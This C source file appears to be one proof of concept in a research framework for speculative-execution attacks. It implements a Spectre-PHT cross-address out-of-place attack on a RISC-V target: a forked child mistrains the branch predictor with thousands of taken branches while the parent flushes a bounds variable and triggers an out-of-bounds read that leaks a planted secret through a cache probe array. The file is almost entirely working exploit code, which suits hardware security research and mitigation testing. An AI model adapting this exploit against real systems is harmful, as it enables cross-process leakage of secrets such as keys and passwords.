#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// PHT ca-oop: cross-address out-of-place via fork + branch spray
// Child sprays taken branches, parent's victim branch mispredicts

// Platform-specific tuning
#ifdef P550
#define MISTRAIN_REPS 16
#define ATTACK_ITERS 100
#define SYNC_ROUNDS 20
#else
#define MISTRAIN_REPS 8
#define ATTACK_ITERS 30
#define SYNC_ROUNDS 10
#endif

#define BENIGN_SIZE PAGE_SIZE

volatile int buf_size = BENIGN_SIZE;
uint8_t* probe_array;

struct evset_pages {
    uint8_t page_barrier1[PAGE_SIZE];
    uint8_t victim[PAGE_SIZE];
    uint8_t page_barrier2[PAGE_SIZE];
    uint8_t secret_data[PAGE_SIZE];
    uint8_t page_barrier3[PAGE_SIZE];
} __attribute__((aligned(PAGE_SIZE))) evset_pages;

uint8_t *const page_barrier1 = evset_pages.page_barrier1;
uint8_t *const victim        = evset_pages.victim;
uint8_t *const page_barrier2 = evset_pages.page_barrier2;
uint8_t *const secret_data   = evset_pages.secret_data;
uint8_t *const page_barrier3 = evset_pages.page_barrier3;

// Branch spray macros for out-of-place training
#define BEQ asm volatile("beq t0, t1, 1f\n1:" : : : );
#define BEQ_16 BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ
#define BEQ_256 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16
#define BEQ_4K BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256

void __attribute__((noinline, aligned(4096))) oop_mistrain() {
    asm volatile("li t0, 1\n li t1, 1" : : : "t0", "t1");
    BEQ_4K
}

void victim_function(int idx) {
    if (idx >= 0 && idx < STALL(buf_size)) {
        SPEC_FENCE();
        maccess(probe_array + victim[idx] * PAGE_SIZE);
    }
}

typedef struct {
    int secret_offset;
#ifdef CACHEUTILS_USE_EVICTION
    eviction_set_t buf_size_set;
#endif
} pht_ca_oop_data_t;

// Sync flags for deterministic interleaving
#define SYNC_FLAG(ctx) ((volatile uint8_t*)((ctx)->shared_secret + 1))
#define SYNC_IDLE 0
#define SYNC_CHILD_GO 1
#define SYNC_CHILD_DONE 2

void pht_ca_oop_setup(exploit_ctx_t* ctx, void* data) {
    *SYNC_FLAG(ctx) = SYNC_IDLE;
    memset(victim, 0x01, PAGE_SIZE);
    memset(page_barrier1, 0x01, PAGE_SIZE);
    memset(page_barrier2, 0x01, PAGE_SIZE);
    memset(page_barrier3, 0x01, PAGE_SIZE);
    memset(secret_data, 0xFF, PAGE_SIZE);

#ifdef CACHEUTILS_USE_EVICTION
    pht_ca_oop_data_t* pht_data = (pht_ca_oop_data_t*)data;
    if (build_eviction_set_vaddr((void*)&buf_size, &pht_data->buf_size_set) != 0) {
        fprintf(stderr, "Failed to build eviction set for buf_size\n");
        exit(1);
    }
    printf("buf_size eviction set: %d addresses\n", pht_data->buf_size_set.num_addrs);
#endif
}

void pht_ca_oop_child_loop(exploit_ctx_t* ctx, void* data) {
    volatile uint8_t* sync = SYNC_FLAG(ctx);

    // Wait for parent signal
    for (int wait = 0; wait < 100000 && *sync != SYNC_CHILD_GO; wait++) {
        asm volatile("" ::: "memory");
    }
    if (*sync != SYNC_CHILD_GO) return;

    // Child: PHT mistraining
    for (int j = 0; j < MISTRAIN_REPS; j++) {
        oop_mistrain();
    }

    // Signal parent that mistraining is done
    *sync = SYNC_CHILD_DONE;
    mfence();
}

void pht_ca_oop_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    pht_ca_oop_data_t* pht_data = (pht_ca_oop_data_t*)data;
    volatile uint8_t* sync = SYNC_FLAG(ctx);

    secret_data[0] = encode_index;

    // Multiple rounds of synchronized mistrain->attack
    for (int round = 0; round < SYNC_ROUNDS; round++) {
        // Signal child to start mistraining
        *sync = SYNC_CHILD_GO;
        mfence();

        // Attack concurrently while child mistrains
        for (int j = 0; j < ATTACK_ITERS; j++) {
#ifdef CACHEUTILS_USE_EVICTION
            evict_with_set(&pht_data->buf_size_set);
#else
            flush((void*)&buf_size);
#endif
            victim_function(pht_data->secret_offset);
        }

        // Wait for child to finish
        for (int wait = 0; wait < 10000 && *sync != SYNC_CHILD_DONE; wait++) {
            asm volatile("" ::: "memory");
        }

        // Reset for next round
        *sync = SYNC_IDLE;
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    pht_ca_oop_data_t pht_data;
    memset(&pht_data, 0, sizeof(pht_data));

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-PHT ca-oop\n");

    pht_data.secret_offset = secret_data - victim;

    exploit_hooks_t hooks = {
        .setup = pht_ca_oop_setup,
        .cleanup = NULL,
        .attack = NULL,
        .attacker_thread = NULL,
        .victim_thread = NULL,
        .pre_measure = NULL,
        .child_loop = pht_ca_oop_child_loop,
        .parent_attack = pht_ca_oop_parent_attack
    };

    exploit_run(&ctx, &hooks, &pht_data);
    exploit_print_results("PHT cross-address out-of-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
